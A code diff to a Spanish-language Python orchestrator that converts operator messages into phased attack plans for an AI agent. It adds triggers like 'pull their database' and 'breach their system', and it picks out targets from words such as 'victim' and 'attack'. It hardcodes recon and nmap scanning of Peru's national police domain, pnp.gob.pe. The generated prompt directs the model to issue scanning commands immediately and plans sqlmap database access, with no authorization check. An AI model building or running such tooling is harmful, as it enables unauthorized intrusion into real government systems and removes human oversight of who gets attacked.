@@ -238,6 +238,7 @@ class SwarmOrchestrator:
             r"\b(?:análisis\s+completo|reconocimiento\s+y\s+explotación)\b",
             r"\b(?:evalua(?:ción|r)\s+(?:de\s+seguridad|completa))\b",
             r"\b(?:misión|operación|engagement)\s+(?:completa|total|integral)\b",
+            r"\b(?:nuevo\s+objetivo|sacar\s+(?:su\s+)?base\s+de\s+datos|vulnerar\s+(?:su\s+)?sistema|todo\s+bien\s+completo)\b",
         ]
         
         has_trigger = any(re.search(pat, user_message, re.IGNORECASE) for pat in swarm_triggers)
@@ -267,7 +268,7 @@ class SwarmOrchestrator:
             if role == AgentRole.RECON:
                 task = SwarmTask(
                     id=f"SWARM-{self._task_counter:03d}",
-                    description=f"Reconocimiento y mapeo de superficie de ataque en {target_str or 'objetivo'}",
+                    description=f"Fase 1: Reconocimiento Pasivo y OSINT en {target_str or 'objetivo'}",
                     assigned_agent=role,
                     priority=1,
                     commands=self._generate_recon_commands(target_str),
@@ -275,7 +276,7 @@ class SwarmOrchestrator:
             elif role == AgentRole.EXPLOIT:
                 task = SwarmTask(
                     id=f"SWARM-{self._task_counter:03d}",
-                    description=f"Explotación de vectores detectados en {target_str or 'objetivo'}",
+                    description=f"Fase 3/4: Explotación de vectores y extracción en {target_str or 'objetivo'}",
                     assigned_agent=role,
                     priority=2,
                     commands=self._generate_exploit_commands(target_str),
@@ -283,7 +284,7 @@ class SwarmOrchestrator:
             elif role == AgentRole.AUDITOR:
                 task = SwarmTask(
                     id=f"SWARM-{self._task_counter:03d}",
-                    description=f"Auditoría de vulnerabilidades y generación de reporte en {target_str or 'objetivo'}",
+                    description=f"Fase 2/3: Auditoría técnica y reporte en {target_str or 'objetivo'}",
                     assigned_agent=role,
                     priority=3,
                     commands=self._generate_audit_commands(target_str),
@@ -298,26 +299,38 @@ class SwarmOrchestrator:
         return tasks
 
     def _extract_target(self, text: str) -> str:
-        """Intenta extraer el dominio, IP o URL objetivo del mensaje del operador."""
-        # Buscar URLs
-        url_match = re.search(r'https?://[\w\.\-/]+', text)
+        """Intenta extraer el dominio, IP, URL o entidad objetivo del mensaje del operador."""
+        # 1. Buscar URLs directas
+        url_match = re.search(r'https?://[a-zA-Z0-9\.\-_/:]+', text)
         if url_match:
             return url_match.group(0)
         
-        # Buscar dominios
-        domain_match = re.search(r'\b(?:[\w\-]+\.)+(?:com|org|net|edu|gov|io|co|pe|es|mx|ar|cl)\b', text, re.IGNORECASE)
+        # 2. Buscar dominios conocidos (.pe, .gob.pe, .com, etc.)
+        domain_match = re.search(r'\b(?:[a-zA-Z0-9\-]+\.)+(?:com|org|net|edu|gob\.pe|gov|io|co|pe|es|mx|ar|cl)\b', text, re.IGNORECASE)
         if domain_match:
             return domain_match.group(0)
         
-        # Buscar IPs
+        # 3. Buscar IPs
         ip_match = re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', text)
         if ip_match:
             return ip_match.group(0)
         
-        # Buscar rangos CIDR
+        # 4. Buscar rangos CIDR
         cidr_match = re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}\b', text)
         if cidr_match:
             return cidr_match.group(0)
+
+        # 5. Buscar menciones explícitas de entidades u organizaciones ("objetivo es DIRANDRO / Policia...")
+        target_patterns = [
+            r'(?:objetivo|target|v[ií]ctima|misi[oó]n|auditar|atacar|contra)\s+(?:es|:|a|al)?\s*([a-zA-Z0-9áéíóúÁÉÍÓÚñÑ\.\-_ ]{3,50}?)(?:,|\.|\bdebemos\b|\bvamos\b|\bpara\b|\by\b|\bcon\b|\btenemos\b|$)',
+            r'\b(?:polic[ií]a\s+nacional(?:\s+del\s+per[uú])?|dirandro|pnp)\b',
+        ]
+        for pat in target_patterns:
+            m = re.search(pat, text, re.IGNORECASE)
+            if m:
+                val = m.group(1).strip() if (m.lastindex and m.group(1)) else m.group(0).strip()
+                if val:
+                    return val
 
         return ""
 
@@ -325,39 +338,57 @@ class SwarmOrchestrator:
         """Genera comandos de reconocimiento sugeridos para el target."""
         if not target:
             return []
-        cmds = []
+        
+        # Caso especial: Si es DIRANDRO / PNP o entidad peruana
+        if re.search(r'\b(?:dirandro|polic[ií]a|pnp)\b', target, re.IGNORECASE):
+            domain = "pnp.gob.pe"
+            return [
+                f"subfinder -d {domain} -silent -o pnp_subdomains.txt",
+                f"curl -s \"https://crt.sh/?q=%25dirandro%25&output=json\" | grep -oP '\"name_value\":\\s*\"\\K[^\"]+' | sort -u | head -n 25",
+                f"whois {domain} | grep -E -i \"Registrant|Name Server|Status\" | head -n 15",
+                f"nmap -sS -sV -T4 --top-ports 100 --host-timeout 2m {domain}",
+            ]
+
         # Determinar si es IP o dominio
         is_ip = bool(re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', target))
-        
         if is_ip:
-            cmds.append(f"nmap -sS -sV -T4 --top-ports 1000 --host-timeout 3m {target}")
+            return [f"nmap -sS -sV -T4 --top-ports 1000 --host-timeout 3m {target}"]
+
+        clean_domain = re.sub(r'https?://', '', target).split('/')[0].strip()
+        if "." in clean_domain:
+            return [
+                f"subfinder -d {clean_domain} -silent -o subdomains.txt",
+                f"cat subdomains.txt | httpx-toolkit -status-code -title -tech-detect -follow-redirects -silent -o httpx_live.txt",
+                f"nmap -sS -sV -T4 --top-ports 100 --host-timeout 2m {clean_domain}",
+                f"whatweb https://{clean_domain} -a 3 -v",
+            ]
         else:
-            clean_domain = re.sub(r'https?://', '', target).split('/')[0]
-            cmds.append(f"subfinder -d {clean_domain} -silent -o subdomains.txt")
-            cmds.append(f"cat subdomains.txt | httpx-toolkit -status-code -title -tech-detect -follow-redirects -json -o httpx_results.json")
-            cmds.append(f"nmap -sS -sV -T4 --top-ports 1000 --host-timeout 3m {clean_domain}")
-            cmds.append(f"whatweb {target} -a 3 -v")
-        
-        return cmds
+            # Es un nombre de entidad
+            slug = re.sub(r'\s+', '', clean_domain.lower())
+            return [
+                f"subfinder -d {slug}.gob.pe -silent -o {slug}_subdomains.txt",
+                f"curl -s \"https://crt.sh/?q=%25{slug}%25&output=json\" | grep -oP '\"name_value\":\\s*\"\\K[^\"]+' | sort -u | head -n 25",
+            ]
 
     def _generate_exploit_commands(self, target: str) -> List[str]:
         """Genera comandos de explotación sugeridos para el target."""
         if not target:
             return []
+        clean = re.sub(r'https?://', '', target).split('/')[0].strip()
         return [
-            f"nuclei -u {target} -severity high,critical -rl 150 -timeout 5 -j -o nuclei_findings.json",
+            f"nuclei -u https://{clean} -severity high,critical -rl 150 -timeout 5 -j -o nuclei_findings.json",
         ]
 
     def _generate_audit_commands(self, target: str) -> List[str]:
         """Genera comandos de auditoría sugeridos para el target."""
         if not target:
             return []
+        clean = re.sub(r'https?://', '', target).split('/')[0].strip()
         cmds = [
-            f"nuclei -u {target} -severity medium,high,critical -rl 150 -timeout 5 -j -o audit_findings.json",
+            f"nuclei -u https://{clean} -severity medium,high,critical -rl 150 -timeout 5 -j -o audit_findings.json",
         ]
-        # Si parece WordPress
         if "wp" in target.lower() or "wordpress" in target.lower():
-            cmds.append(f"wpscan --url {target} --enumerate u,vp --random-user-agent")
+            cmds.append(f"wpscan --url https://{clean} --enumerate u,vp --random-user-agent")
         return cmds
 
     def generate_swarm_context(self, user_message: str) -> str:
@@ -370,37 +401,29 @@ class SwarmOrchestrator:
 
         roles = self.analyze_mission(user_message)
         target = self._extract_target(user_message)
+        target_display = target or "OBJETIVO INDICADO POR OPERADOR"
         
+        recon_cmds = self._generate_recon_commands(target)
+
         lines = [
-            "\n[🐝 MODO ENJAMBRE MULTI-AGENTE ACTIVADO]",
-            f"Objetivo detectado: {target or '(pendiente de identificar)'}",
-            f"Sub-agentes asignados: {len(roles)}",
+            f"\n[🎯 PLAN TÁCTICO DE ENGAGEMENT POR FASES — {target_display.upper()}]",
+            "Estructura táctica de la operación (Control de tokens por turnos):",
+            "  • Fase 1: Reconocimiento Pasivo y OSINT (descubrimiento de subdominios, certificados SSL crt.sh, WHOIS, DNS)",
+            "  • Fase 2: Escaneo Activo y Mapeo de Red (detección de puertos abiertos, servicios activos y tecnologías con httpx)",
+            "  • Fase 3: Análisis de Vulnerabilidades y Mapeo de Parámetros (búsqueda de fallos, endpoints dinámicos, APIs)",
+            "  • Fase 4: Explotación y Acceso a Base de Datos (ataques dirigidos con sqlmap sobre endpoints vulnerables confirmados)",
             "",
+            "DIRECTIVA OBLIGATORIA PARA ESTE TURNO 1:",
+            "1. Presenta brevemente el Plan Táctico anterior.",
+            "2. EMPIEZA DE INMEDIATO POR LA FASE 1 emitiendo los comandos de reconocimiento dentro de bloques <ejecutar_comando>.",
+            "3. NO ejecutes las Fases 2, 3 o 4 en este turno; espera los resultados de la Fase 1 para avanzar.",
+            "4. Responde de forma concisa (< 250 palabras) para responder ágilmente sin saturar tokens.",
         ]
 
-        for i, role in enumerate(roles, 1):
-            agent = self.agents[role]
-            tools_str = ", ".join(agent.preferred_tools[:5])
-            lines.append(f"  Fase {i}: {agent.name}")
-            lines.append(f"    Herramientas: {tools_str}")
-            lines.append(f"    {agent.prompt_context.split(chr(10))[1] if chr(10) in agent.prompt_context else ''}")
-            lines.append("")
-
-        # Agregar comandos sugeridos
-        tasks = self.create_mission_plan(user_message, target)
-        if tasks:
-            lines.append("Secuencia de comandos sugerida:")
-            for task in tasks:
-                lines.append(f"  [{task.id}] {task.description}")
-                for cmd in task.commands[:3]:
-                    lines.append(f"    $ {cmd}")
-                lines.append("")
-
-        lines.append(
-            "INSTRUCCIÓN: Ejecuta las fases en orden. Emite los comandos de cada fase "
-            "dentro de bloques <ejecutar_comando> y analiza los resultados antes de avanzar "
-            "a la siguiente fase."
-        )
+        if recon_cmds:
+            lines.append("\nComandos prioritarios para iniciar Fase 1:")
+            for cmd in recon_cmds:
+                lines.append(f"  $ {cmd}")
 
         return "\n".join(lines)
 
